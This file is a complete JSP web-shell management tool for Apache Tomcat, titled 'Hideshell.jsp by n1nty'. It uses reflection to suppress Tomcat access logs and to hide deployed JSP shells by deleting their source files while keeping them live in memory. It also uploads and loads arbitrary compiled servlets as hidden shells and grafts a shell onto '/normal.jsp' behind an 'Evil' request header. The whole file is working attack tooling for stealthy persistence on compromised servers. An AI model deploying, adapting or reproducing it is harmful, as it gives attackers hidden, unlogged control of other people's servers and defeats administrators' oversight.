<%@page import="java.awt.SystemColor"%>
<%@page import="org.apache.jasper.JspCompilationContext"%>
<%@page import="java.io.*"%>
<%@page import="java.util.*"%>
<%@page import="java.util.zip.*"%>
<%@ page import="javax.servlet.jsp.*"%>
<%@page import="org.apache.jasper.EmbeddedServletOptions"%>
<%@page import="org.apache.jasper.compiler.JspRuntimeContext"%>
<%@page import="org.apache.jasper.servlet.JspServletWrapper" %>
<%@page import="org.apache.catalina.valves.AccessLogValve"%>
<%@page import="org.apache.catalina.AccessLog"%>
<%@page import="org.apache.catalina.core.AccessLogAdapter"%>
<%@page import="org.apache.catalina.core.StandardHost"%>
<%@ page import="org.apache.catalina.core.ApplicationContext"%>
<%@ page import="org.apache.catalina.core.StandardContext"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ page import="java.lang.reflect.*" %><%!
private static class AttachingWrapper extends JspServletWrapper {
	private JspServletWrapper original = null;
	private JspServletWrapper evil = null;
	
	public AttachingWrapper(JspServletWrapper original, JspServletWrapper evil, ServletConfig config, org.apache.jasper.Options options,
            String jspUri, JspRuntimeContext rctxt) {
		super(config, options, jspUri, rctxt);
		this.original = original;
		this.evil = evil;
	}
	public void service(HttpServletRequest request, 
                        HttpServletResponse response,
                        boolean precompile)
            throws ServletException, IOException, FileNotFoundException {
            	if (request.getHeader("Evil") != null) {
            		try {
						nolog(request);
            		} catch (Exception ex){}
            		this.evil.service(request, response, precompile);
            	} else {
            		this.original.service(request, response, precompile);
            	}
	}
}
private static class SpyClassLoader extends ClassLoader{
	private byte[] zipdata = null;
	private JspWriter out = null;
	private Map<String, byte[]> cls = new HashMap<String, byte[]>();
	public SpyClassLoader(ClassLoader parent,  byte[] zipdata, JspWriter out) throws Exception {
		super(parent);
		this.out = out;
		this.zipdata = zipdata;
		this.processZip();
	}
	private void processZip() throws Exception {
		if (this.zipdata != null) {
			ZipInputStream stream = null;
			stream = new ZipInputStream(new ByteArrayInputStream(this.zipdata));
				byte[] buffer = new byte[2048];
				ZipEntry entry;
				while((entry = stream.getNextEntry())!=null)
				{
					
					ByteArrayOutputStream output = null;
					try
					{
						output = new ByteArrayOutputStream();
						int len = 0;
						while ((len = stream.read(buffer)) > 0)
						{
							output.write(buffer, 0, len);
						}
					}
					finally
					{
						if(output!=null) output.close();
						//this.out.println(entry.getName());
						this.cls.put("org.apache.jsp."+entry.getName(), output.toByteArray());
					}
				}
			stream.close();
		}
	}
	protected Class<?> findClass(String name)
                      throws ClassNotFoundException {
        byte[] clsdata = this.cls.get(name+".class");
        if (clsdata != null) {
        	return super.defineClass(name, clsdata, 0, clsdata.length);
        }
        return null;
	}
	public Class defineClass(String name,byte[] b) {
		return super.defineClass(name,b,0,b.length);
	}
}
private static class UploadBean {
		private ServletInputStream sis = null;
		private OutputStream targetOutput = null;
		private byte[] b = new byte[1024];
		private String fileName = null;
		public String getFileName() {
			return this.fileName;
		}
		public void setTargetOutput(OutputStream stream) {
			this.targetOutput = stream;
		}
		public UploadBean(OutputStream stream) {
			this.setTargetOutput(stream);
		}
		
		public void parseRequest(HttpServletRequest request) throws IOException {
			  sis = request.getInputStream();
			  int a = 0;
			  int k = 0;
			  String s = "";
			  while ((a = sis.readLine(b,0,b.length))!= -1) {
				s = new String(b, 0, a,"UTF-8");
				 if ((k = s.indexOf("filename=\""))!= -1) {
					s = s.substring(k + 10);
					k = s.indexOf("\"");
					s = s.substring(0, k);
					File tF = new File(s);
					if (tF.isAbsolute()) {
						fileName = tF.getName();
					} else {
						fileName = s;
					}
					k = s.lastIndexOf(".");
					// suffix = s.substring(k + 1);
					upload();
				 }
			  }
		}
		private void upload() throws IOException{
			try {
					OutputStream out = this.targetOutput;
					
					 int a = 0;
					 int k = 0;
					 String s = "";
					 while ((a = sis.readLine(b,0,b.length))!=-1) {
						s = new String(b, 0, a);
						if ((k = s.indexOf("Content-Type:"))!=-1) {
						  break;
						}
					}
					sis.readLine(b,0,b.length);
					while ((a = sis.readLine(b,0,b.length)) != -1) {
						s = new String(b, 0, a);
						if ((b[0] == 45) && (b[1] == 45) && (b[2] == 45) && (b[3] == 45) && (b[4] == 45)) {
						  break;
						}
						out.write(b, 0, a);
					}
					out.close();
					//if (out instanceof FileOutputStream)
						//out.close();
				} catch (IOException ioe) {
					throw ioe;
				}
		}
	}
private static final Map<String, JspServletWrapper> hiddenWrappers = new HashMap<String, JspServletWrapper>();
public static String makeWrapperUri(HttpServletRequest request) {
	String uri = request.getServletPath();
	String pathinfo = request.getPathInfo();
	if (pathinfo != null) {
		uri += pathinfo;
	}
	return uri;
}
public static boolean accessingSelf(HttpServletRequest request, JspRuntimeContext jctxt) {
	JspServletWrapper wrapper = getHideShellWrapper(request, jctxt);
	String requestUri = makeWrapperUri(request);
	if (!wrapper.getJspUri().equals(requestUri)) {
		return false;
	}
	return true;
}
public static void includeHiddenShell(HttpServletRequest request, HttpServletResponse response) throws Exception {
	JspServletWrapper wrapper = hiddenWrappers.get(makeWrapperUri(request));
	if (wrapper != null) {
		wrapper.service(request, response, false);
	} else {
		response.sendError(404, "the hidden JspServletWrapper doesn't exist, this should not happen");
	}
}
public static JspServletWrapper getHideShellWrapper(HttpServletRequest request, JspRuntimeContext jctxt) {
	String wrapperUri = makeWrapperUri(request);
	JspServletWrapper self = jctxt.getWrapper(wrapperUri); 
	return self;
}
public static void hideWrapper(JspServletWrapper wrapper) throws Exception {
	wrapper.setLastModificationTest(System.currentTimeMillis() + 31536000 * 1000);
	JspCompilationContext ctxt = wrapper.getJspEngineContext();
	EmbeddedServletOptions jspServletOptions = (EmbeddedServletOptions)ctxt.getOptions();
	if ((Integer)getFieldValue(jspServletOptions, "modificationTestInterval") <= 0) {
		setFieldValue(jspServletOptions, "modificationTestInterval", 1);	
	}
}
public static Object invoke(Object obj, String methodName, Class[] paramTypes, Object[] args) throws Exception {
	Method m = obj.getClass().getDeclaredMethod(methodName, paramTypes);
	m.setAccessible(true);
	return m.invoke(obj, args);
}
public static Object getFieldValue(Object obj, String fieldName) throws Exception {
	Field f = obj.getClass().getDeclaredField(fieldName);
	f.setAccessible(true);
	return f.get(obj);
}
public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
	Field f = obj.getClass().getDeclaredField(fieldName);
	f.setAccessible(true);
	if (Modifier.isFinal(f.getModifiers())) {
		//reset final field
		Field modifiersField = Field.class.getDeclaredField("modifiers");
	    modifiersField.setAccessible(true);
	    modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);	
	}
	f.set(obj, value);
}
public static String makeHiddenName(String wrapperName) {
	int lastIndex = wrapperName.lastIndexOf('/');
	return wrapperName.substring(0, lastIndex + 1) + "hidden-" + wrapperName.substring(lastIndex + 1);
}
public static boolean isHiddenJsp(ServletRequest request, String key, JspServletWrapper wrapper) {
	JspCompilationContext ctxt = wrapper.getJspEngineContext();
	if (!new File(request.getServletContext().getRealPath(ctxt.getJspFile())).exists() || !key.equals(wrapper.getJspUri())) {
		return true;
	}
	return  false;
}
public static void nolog(HttpServletRequest request) throws Exception {
	ServletContext ctx = request.getSession().getServletContext();
	ApplicationContext appCtx = (ApplicationContext)getFieldValue(ctx, "context");
	StandardContext standardCtx = (StandardContext)getFieldValue(appCtx, "context");
	
	StandardHost host = (StandardHost)standardCtx.getParent();
	AccessLogAdapter accessLog = (AccessLogAdapter)host.getAccessLog();
	
	AccessLog[] logs = (AccessLog[])getFieldValue(accessLog, "logs");
	for(AccessLog log:logs) {
		AccessLogValve logV = (AccessLogValve)log;
		String condition = logV.getCondition() == null ? "n1nty_nolog" : logV.getCondition();
		logV.setCondition(condition);
		request.setAttribute(condition, "n1nty_nolog");
	}
}
%><%
nolog(request);
Object r = getFieldValue(request, "request");
Object filterChain = getFieldValue(r, "filterChain");
Object servlet = getFieldValue(filterChain, "servlet");
JspRuntimeContext jctxt = (JspRuntimeContext)getFieldValue(servlet, "rctxt");
if (!accessingSelf(request, jctxt)) {
	includeHiddenShell(request, response);
	return;
}
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Hideshell.jsp by n1nty</title>
</head>
<body>

<ul>
<%
String action = request.getParameter("action");
if ("upload".equals(action)) {
	ByteArrayOutputStream byteout = new ByteArrayOutputStream();
	UploadBean upload = new UploadBean(byteout);
	upload.parseRequest(request);
	boolean zip = upload.getFileName().endsWith(".zip");
	String path = !zip ? "/test.jsp" : "/jspspy2010.jsp";
	String clsName = !zip ? "org.apache.jsp.test_jsp" : "org.apache.jsp.jspspy2010_jsp";
	javax.servlet.ServletConfig servletConfig = (javax.servlet.ServletConfig)getFieldValue(servlet, "config");
	org.apache.jasper.Options options = (org.apache.jasper.Options)getFieldValue(servlet, "options");
	JspServletWrapper wrapper = new JspServletWrapper(servletConfig, options, path, jctxt);
	hideWrapper(wrapper);
	wrapper.setReload(false);
	byte[] data = byteout.toByteArray();
	byte[] bytes = new byte[data.length -2];
	System.arraycopy(data, 0, bytes, 0, data.length -2);
	Class cls = null;
	if (zip) {
		cls = new SpyClassLoader(this.getClass().getClassLoader(), bytes, out).loadClass(clsName);
	} else {
		cls = new SpyClassLoader(this.getClass().getClassLoader(), null, out).defineClass(clsName, bytes);
	}
	if (cls != null) {
		Servlet s = (Servlet)cls.newInstance();
		s.init(servletConfig);
		setFieldValue(wrapper, "theServlet", s);
		jctxt.addWrapper(path, getHideShellWrapper(request, jctxt));
		hiddenWrappers.put(path, wrapper);
	} else {
		out.println("no class");
	}
	
	
}
if (action == null || action.equals("list") || action.equals("upload")) {
	Map<String, JspServletWrapper> jsps = (Map<String, JspServletWrapper>)getFieldValue(jctxt, "jsps");
	for (Map.Entry<String, JspServletWrapper> entry : jsps.entrySet()) {
		JspServletWrapper wrapper = entry.getValue();
		%>
		<li>		 
		<%
		if (isHiddenJsp(request, entry.getKey(), wrapper)) {
			%>
			<a href='<%=entry.getKey() %>'> <%=entry.getKey() %></a> possible hidden file,  <a href='?action=delete&wrapperName=<%=entry.getKey() %>'> Delete </a>
			<a href='?action=attach&wrapperName=<%=entry.getKey() %>'> Attach to normal.jsp</a>
			<%
		} else {
			%>
			<a href='?action=hide&wrapperName=<%=entry.getKey() %>'>Hide <%=entry.getKey() %></a>
			<a href='?action=attach&wrapperName=<%=entry.getKey() %>'> Attach to normal.jsp</a>
			<%
		}
		%>
		</li>
		<%
	}
} else if (action.equals("hide")) {
	String wrapperName = request.getParameter("wrapperName");
	String hiddenWrapperName = makeHiddenName(wrapperName);
	if (jctxt.getWrapper(hiddenWrapperName) == null) {
		JspServletWrapper wrapper = jctxt.getWrapper(wrapperName);
		
		hideWrapper(wrapper);
		/*
		wrapper.setLastModificationTest(System.currentTimeMillis() + 31536000 * 1000);
		JspCompilationContext ctxt = wrapper.getJspEngineContext();
		EmbeddedServletOptions jspServletOptions = (EmbeddedServletOptions)ctxt.getOptions();
		if ((Integer)getFieldValue(jspServletOptions, "modificationTestInterval") <= 0) {
			setFieldValue(jspServletOptions, "modificationTestInterval", 1);	
		}*/
		
		wrapper.getJspEngineContext().getCompiler().removeGeneratedFiles();
		
		if (wrapper == getHideShellWrapper(request, jctxt)) {
			// is hiding hideshell.jsp itself
			setFieldValue(wrapper, "jspUri", hiddenWrapperName);
			jctxt.addWrapper(hiddenWrapperName, wrapper);
		} else {
			jctxt.addWrapper(hiddenWrapperName, getHideShellWrapper(request, jctxt));
			hiddenWrappers.put(hiddenWrapperName, wrapper);
		}
		
		jctxt.removeWrapper(wrapperName);
		JspCompilationContext ctxt = wrapper.getJspEngineContext();
		new File(request.getServletContext().getRealPath(ctxt.getJspFile())).delete();
	}
	out.println("done");
}  else if (action.equals("delete")) {
	String wrapperName = request.getParameter("wrapperName");
	jctxt.removeWrapper(wrapperName);
	hiddenWrappers.remove(wrapperName);
	out.println("done");
	
} else if (action.equals("attach")) {
	String wrapperName = request.getParameter("wrapperName");
	String attachto = "/normal.jsp";
	JspServletWrapper original = jctxt.getWrapper(attachto);
	if (original == null) {
		out.println("access /normal.jsp first");
		return;
	}
	JspServletWrapper evil = jctxt.getWrapper(wrapperName);
	javax.servlet.ServletConfig servletConfig = (javax.servlet.ServletConfig)getFieldValue(servlet, "config");
	org.apache.jasper.Options options = (org.apache.jasper.Options)getFieldValue(servlet, "options");
	AttachingWrapper attachingWrapper = new AttachingWrapper(original, evil, servletConfig, options, attachto, jctxt);
	hideWrapper(attachingWrapper);
	attachingWrapper.setReload(false);
	hideWrapper(evil);
	jctxt.removeWrapper(wrapperName);
	jctxt.removeWrapper(attachto);
	jctxt.addWrapper(attachto, attachingWrapper);
	JspCompilationContext ctxt = evil.getJspEngineContext();
	new File(request.getServletContext().getRealPath(ctxt.getJspFile())).delete();
	// jctxt.addWrapper(attachto, getHideShellWrapper(request, jctxt));
	// hiddenWrappers.put(attachto, attachingWrapper);
}
%>
</ul>

<form action="?action=upload" method="post" enctype="multipart/form-data">
<input type="file" name="fff">
<input type="submit">
</form>

</body>
</html>
